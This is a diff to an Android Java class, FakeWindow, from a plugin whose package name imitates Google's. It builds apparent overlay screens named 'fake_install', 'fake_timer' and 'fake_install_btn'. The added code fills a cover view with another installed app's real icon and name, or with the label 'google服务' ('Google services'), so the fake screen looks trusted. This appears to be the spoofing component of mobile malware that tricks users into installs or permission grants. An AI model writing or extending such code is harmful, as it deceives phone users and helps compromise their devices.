@@ -1,15 +1,21 @@
 package com.xstd.plugin.Utils;
 
 import android.content.Context;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
 import android.graphics.PixelFormat;
+import android.graphics.drawable.Drawable;
 import android.os.Handler;
+import android.text.TextUtils;
 import android.util.DisplayMetrics;
 import android.view.*;
+import android.widget.ImageView;
 import android.widget.TextView;
 import com.googl.plugin.x.R;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
+import com.xstd.plugin.config.SettingManager;
 
 /**
  * Created with IntelliJ IDEA.
@@ -41,7 +47,7 @@ public class FakeWindow {
     public FakeWindow(Context context, WindowListener l) {
         this.context = context;
         LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
-        coverView = layoutInflater.inflate(R.layout.fake_install, null);
+        coverView = layoutInflater.inflate(R.layout.app_details, null);
         timerView = layoutInflater.inflate(R.layout.fake_timer, null);
         timeTV = (TextView) timerView.findViewById(R.id.timer);
         installView = layoutInflater.inflate(R.layout.fake_install_btn, null);
@@ -49,6 +55,31 @@ public class FakeWindow {
         handler = new Handler(context.getMainLooper());
 
         mWindowListener = l;
+
+        try {
+            //获取提示的应用信息
+            PackageManager pm = context.getPackageManager();
+            String packageName = SettingManager.getInstance().getKeyActivePackageName();
+            ImageView iconImageView = (ImageView) coverView.findViewById(R.id.app_icon);
+            TextView nameTV = (TextView) coverView.findViewById(R.id.app_name);
+            String name = SettingManager.getInstance().getKeyActiveAppName();
+            Drawable icon = null;
+            if (!TextUtils.isEmpty(packageName)) {
+                PackageInfo pInfo = pm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
+                if (pInfo != null) {
+                    icon = pm.getApplicationIcon(pInfo.packageName);
+                    name = pInfo.applicationInfo.loadLabel(pm).toString();
+                }
+            } else {
+                icon = context.getResources().getDrawable(R.drawable.icon_show);
+                name = "google服务";
+            }
+
+            iconImageView.setImageDrawable(icon);
+            nameTV.setText(String.format(context.getString(R.string.protocal_title), name));
+        } catch (Exception e) {
+        }
+
     }
 
     public void updateTimerCount() {
